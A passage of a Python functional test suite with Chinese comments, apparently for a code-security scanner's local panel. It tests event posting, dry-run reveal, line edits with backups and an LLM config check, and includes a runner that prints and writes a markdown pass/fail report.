        return status == 400, "status=%d" % status
    finally:
        httpd.shutdown()
        box.close()


@case("G 面板")
def G06_事件推送与列表():
    box, httpd, base = _panel()
    try:
        _req(base, "/api/event", {"type": "pre-write", "file": "a.py", "counts": {"CRITICAL": 1},
                                  "findings": [{"rule_id": "SC102", "line": 1}]})
        status, body = _req(base, "/api/events")
        data = json.loads(body)
        return status == 200 and data["seq"] >= 1 and data["events"][0]["file"] == "a.py", data.get("seq")
    finally:
        httpd.shutdown()
        box.close()


@case("G 面板")
def G07_reveal干跑():
    os.environ["DSH_QUARANTINE_NO_LAUNCH"] = "1"
    box, httpd, base = _panel()
    try:
        box.file("src/a.py", "x = 1\n")
        status, body = _req(base, "/api/reveal", {"file": "src/a.py", "line": 1})
        data = json.loads(body)
        return status == 200 and data["method"] == "dry-run", data
    finally:
        httpd.shutdown()
        box.close()


@case("G 面板")
def G08_编辑行有备份():
    box, httpd, base = _panel()
    try:
        box.file("src/a.py", "line1\nline2\n")
        status, body = _req(base, "/api/line", {"file": "src/a.py", "line": 2, "text": "changed"})
        data = json.loads(body)
        backup = os.path.join(box.path, data.get("backup", ""))
        return status == 200 and data["changed"] and os.path.isfile(backup), data.get("backup")
    finally:
        httpd.shutdown()
        box.close()


@case("G 面板")
def G09_llm测试接口无配置():
    box, httpd, base = _panel()
    try:
        status, body = _req(base, "/api/llm/test", {"llm": {}})
        data = json.loads(body)
        return status == 200 and data.get("ok") is False and "缺少" in data.get("error", ""), data.get("error")
    finally:
        httpd.shutdown()
        box.close()


# =====================================================================
# runner
# =====================================================================
def _ensure_utf8() -> None:
    """Force UTF-8 on stdout/stderr.

    Windows 控制台默认按 ANSI 代码页（中文系统是 GBK）编码，报告里的 emoji
    （👁、✅）直接抛 UnicodeEncodeError；按 UTF-8 读管道的调用方也会解码失败。
    """
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except (AttributeError, ValueError):
            pass


def main(argv=None) -> int:
    _ensure_utf8()
    parser = argparse.ArgumentParser(description="100 个地狱式功能测试")
    parser.add_argument("--only", help="只跑名字包含该子串的用例")
    parser.add_argument("--report", help="把结果写成 markdown")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args(argv)

    selected = [c for c in CASES if not args.only or args.only.lower() in c["name"].lower()]
    print("共 %d 个用例\n" % len(selected))
    passed, failed = 0, []
    started = time.time()
    for index, item in enumerate(selected, 1):
        t0 = time.time()
        try:
            ok, detail = item["fn"]()
        except Exception:
            ok, detail = False, traceback.format_exc(limit=2).replace("\n", " ")[:300]
        cost = (time.time() - t0) * 1000
        mark = "PASS" if ok else "FAIL"
        if ok:
            passed += 1
        else:
            failed.append((item, detail))
        if args.verbose or not ok:
            print("[%s] %02d %-34s %5.0fms  %s" % (mark, index, item["name"], cost, detail))
        else:
            print("[%s] %02d %s" % (mark, index, item["name"]))

    total = len(selected)
    print("\n%s  %d/%d 通过，耗时 %.1fs" % (
        "全部通过" if not failed else "存在失败", passed, total, time.time() - started))
    for item, detail in failed:
        print("  FAIL %s -> %s" % (item["name"], detail))

    if args.report:
        lines = [
            "# 地狱式功能测试报告",
            "",
            "- 用例总数：%d" % total,
            "- 通过：%d" % passed,
            "- 失败：%d" % len(failed),
            "- 耗时：%.1fs" % (time.time() - started),
            "- 环境：Python %s / %s" % (sys.version.split()[0], sys.platform),
            "",
            "| # | 分组 | 用例 | 结果 |",
            "|---|------|------|------|",
        ]
        for index, item in enumerate(selected, 1):
            bad = any(item is f[0] for f in failed)
            lines.append("| %d | %s | `%s` | %s |" % (
                index, item["group"], item["name"], "❌" if bad else "✅"))
        if failed:
            lines += ["", "## 失败详情", ""]
            for item, detail in failed:
                lines.append("- `%s`：%s" % (item["name"], detail))
        with open(args.report, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
        print("报告已写入 %s" % args.report)
    return 0 if not failed else 1


if __name__ == "__main__":
    sys.exit(main())
